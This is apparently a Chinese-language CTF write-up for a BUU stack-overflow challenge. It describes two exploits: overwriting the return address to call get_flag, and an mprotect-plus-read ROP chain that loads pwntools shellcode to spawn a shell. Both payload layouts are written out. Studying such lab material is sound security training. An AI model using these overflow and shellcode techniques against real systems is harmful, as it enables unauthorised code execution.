+++
title = "wp"
date = "2026-04-14"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
第一种方式常规exp1
通过填满栈来溢出，将getflag函数塞到返回地址里面
- 调用`get_flag(arg1)`时，系统会先把`arg1`放进最后一个格子，再放 “执行完要跳回的地址（exit）”，最后跳去执行`get_flag`；
- 我们构造 payload，就是手动模拟这个 “放参数→放返回地址” 的过程，只不过是通过溢出把这些内容 “填” 到对应的格子里。
- payload = 填充字节(offset) + get_flag函数地址 + exit函数地址 + get_flag的参数(可选)
之后函数需要参数时都应放在返回地址之后


第二种方式exp2
有一个函数mprotect
ssize_t read(int fd, void _buf, size_t count);  
fd 设为0时就可以从输入端读取内容  
buf 设为我们想要执行的内存地址  
size 适当大小就可以  
	payload1= b"A"_0x38+p32(mprotect地址，跳转到函数执行)+p32(gadget，mprotect需要三个参数，我们可以查找合适的gadget)+p32(memaddr，被修改的内存地址)+p32(0x100，被修改的内存大小)+p32(0x7，内存权限rwx，二进制111，也就是7)+p32(read，返回到read函数地址)+p32(memaddr，read函数的返回地址)+p32(0，read函数的参数1)+p32(memaddr，read函数的参数2)+p32(0x100，read函数的参数3)+p32(memaddr，指向修改的内存地址)

最后
payload = asm(shellcraft.sh())  
print(payload)  
p.sendline(payload)
拿shell
